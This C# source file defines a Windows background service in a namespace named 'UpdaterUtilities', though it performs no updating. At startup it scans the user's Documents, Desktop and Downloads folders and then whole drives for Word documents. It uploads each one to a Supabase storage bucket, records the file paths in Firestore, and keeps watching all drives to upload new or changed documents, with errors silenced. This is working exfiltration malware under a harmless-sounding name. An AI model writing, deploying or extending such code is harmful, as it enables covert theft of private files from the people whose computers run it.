using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Configuration;
using System.IO;
using Supabase;
using System.Threading;
using System.Threading.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using Google.Cloud.Firestore;

namespace UpdaterUtilities
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;
        private readonly IConfiguration _config;
        private readonly string _bucketName;
        private readonly string _logPath;
        private readonly List<FileSystemWatcher> _watchers = new();
        private readonly Client _supabaseClient;
        private readonly FirestoreDb _firestoreDb;

        public Worker(ILogger<Worker> logger, IConfiguration config)
        {
            _logger = logger;
            _config = config;
            _bucketName = _config["BucketName"] ?? throw new InvalidOperationException("BucketName is not configured.");
            _logPath = _config["LogPath"] ?? throw new InvalidOperationException("LogPath is not configured.");
            var url = _config["Supabase:Url"] ?? throw new InvalidOperationException("Supabase:Url is not configured.");
            var anonKey = _config["Supabase:AnonKey"] ?? throw new InvalidOperationException("Supabase:AnonKey is not configured.");
            var firestoreProjectId = _config["Firestore:ProjectId"] ?? throw new InvalidOperationException("Firestore:ProjectId is not configured.");
            var firestoreCredentialJson = _config["Firestore:CredentialJson"] ?? throw new InvalidOperationException("Firestore:CredentialJson is not configured.");
            _supabaseClient = new Client(url, anonKey);
            Environment.SetEnvironmentVariable("GOOGLE_APPLICATION_CREDENTIALS", firestoreCredentialJson);
            _firestoreDb = FirestoreDb.Create(firestoreProjectId);
            LogInfo($"Initialized Worker with URL: {url}, Bucket: {_bucketName}");
        }

        public override async Task StartAsync(CancellationToken cancellationToken)
        {
            LogInfo("Starting Supabase client initialization...");
            await _supabaseClient.InitializeAsync();
            LogInfo("Supabase client initialized.");
            await base.StartAsync(cancellationToken);
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            var drives = DriveInfo.GetDrives()
                .Where(d => d.IsReady)
                .ToList();
            LogInfo($"Found {drives.Count} drives");

            foreach (var drive in drives)
            {
                LogInfo($"Scanning existing files on {drive.Name}");
                UploadExistingFiles(drive.RootDirectory.FullName);
            }

            foreach (var drive in drives)
            {
                var watcher = new FileSystemWatcher
                {
                    Path = drive.RootDirectory.FullName,
                    IncludeSubdirectories = true,
                    Filter = "*.doc*",
                    NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite,
                    InternalBufferSize = 64 * 1024
                };

                watcher.Created += OnFileChanged;
                watcher.Changed += OnFileChanged;
                watcher.EnableRaisingEvents = true;
                _watchers.Add(watcher);
                LogInfo($"Started watcher on {drive.Name}");
            }

            while (!stoppingToken.IsCancellationRequested)
            {
                await Task.Delay(1000, stoppingToken);
            }

            foreach (var watcher in _watchers)
            {
                watcher.Dispose();
            }
        }

        private async void OnFileChanged(object sender, FileSystemEventArgs e)
        {
            try
            {
                if (!e.FullPath.EndsWith(".doc", StringComparison.OrdinalIgnoreCase) &&
                    !e.FullPath.EndsWith(".docx", StringComparison.OrdinalIgnoreCase)) return;

                var remotePath = $"{DateTime.UtcNow:yyyyMMddHHmmss}_{Path.GetFileName(e.FullPath)}";
                LogInfo($"Detected file change: {e.FullPath}, uploading to {remotePath}");
                await UploadFile(e.FullPath, remotePath);
            }
            catch (Exception ex)
            {
                LogError($"Upload failed for {e.FullPath}: {ex.Message}");
            }
        }

        private async Task UploadFile(string localPath, string remotePath)
        {
            try
            {
                var bucket = _supabaseClient.Storage.From(_bucketName);
                await bucket.Upload(localPath, remotePath, new Supabase.Storage.FileOptions
                {
                    CacheControl = "3600",
                    Upsert = true
                });
                LogInfo($"Successfully uploaded {localPath} to {remotePath}");
                await LogToFirestore(localPath, remotePath);
            }
            catch (Exception ex)
            {
                LogError($"Upload error for {localPath}: {ex.Message}");
            }
        }

        private void UploadExistingFiles(string rootPath)
        {
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var specialFolders = new[]
                {
                    Path.Combine(userProfile, "Documents"),
                    Path.Combine(userProfile, "Desktop"),
                    Path.Combine(userProfile, "Downloads")
                }.Where(f => Directory.Exists(f) && f.StartsWith(rootPath, StringComparison.OrdinalIgnoreCase));

                foreach (var folder in specialFolders)
                {
                    LogInfo($"Scanning special folder: {folder}");
                    var files = Directory.EnumerateFiles(folder, "*.doc*", SearchOption.AllDirectories)
                        .Where(f => f.EndsWith(".doc", StringComparison.OrdinalIgnoreCase) ||
                                   f.EndsWith(".docx", StringComparison.OrdinalIgnoreCase));
                    foreach (var file in files)
                    {
                        var remotePath = $"{DateTime.Now:yyyyMMddHHmmss}_{Path.GetFileName(file)}";
                        LogInfo($"Uploading existing file: {file}");
                        UploadFile(file, remotePath).Wait();
                    }
                }

                LogInfo($"Scanning entire drive: {rootPath}");
                var driveFiles = Directory.EnumerateFiles(rootPath, "*.doc*", SearchOption.AllDirectories)
                    .Where(f => f.EndsWith(".doc", StringComparison.OrdinalIgnoreCase) ||
                               f.EndsWith(".docx", StringComparison.OrdinalIgnoreCase) &&
                               !f.Contains("\\Windows\\") && !f.Contains("\\Program Files\\") && !f.Contains("\\ProgramData\\"));
                foreach (var file in driveFiles)
                {
                    var remotePath = $"{DateTime.Now:yyyyMMddHHmmss}_{Path.GetFileName(file)}";
                    LogInfo($"Uploading existing file: {file}");
                    UploadFile(file, remotePath).Wait();
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                LogWarning($"Skipping protected folder in {rootPath}: {ex.Message}");
            }
            catch (Exception ex)
            {
                LogError($"Initial scan failed for {rootPath}: {ex.Message}");
            }
        }

        private void LogInfo(string message)
        {
            _logger.LogInformation(message);
            try
            {
                File.AppendAllText(_logPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}: INFO: {message}\n");
            }
            catch { /* Silent fail */ }
        }

        private void LogWarning(string message)
        {
            _logger.LogWarning(message);
            try
            {
                File.AppendAllText(_logPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}: WARNING: {message}\n");
            }
            catch { /* Silent fail */ }
        }

        private void LogError(string message)
        {
            _logger.LogError(message);
            try
            {
                File.AppendAllText(_logPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}: ERROR: {message}\n");
            }
            catch { /* Silent fail */ }
        }

        private async Task LogToFirestore(string localPath, string remotePath)
        {
            try
            {
                var data = new Dictionary<string, object>
                {
                    { "file_name", Path.GetFileName(localPath) },
                    { "full_path", localPath },
                    { "remote_path", remotePath },
                    { "upload_time", Timestamp.FromDateTime(DateTime.UtcNow) }
                };
                await _firestoreDb.Collection("file_logs").AddAsync(data);
                LogInfo($"Logged {localPath} to Firestore");
            }
            catch (Exception ex)
            {
                LogError($"Firestore log failed for {localPath}: {ex.Message}");
            }
        }
    }
}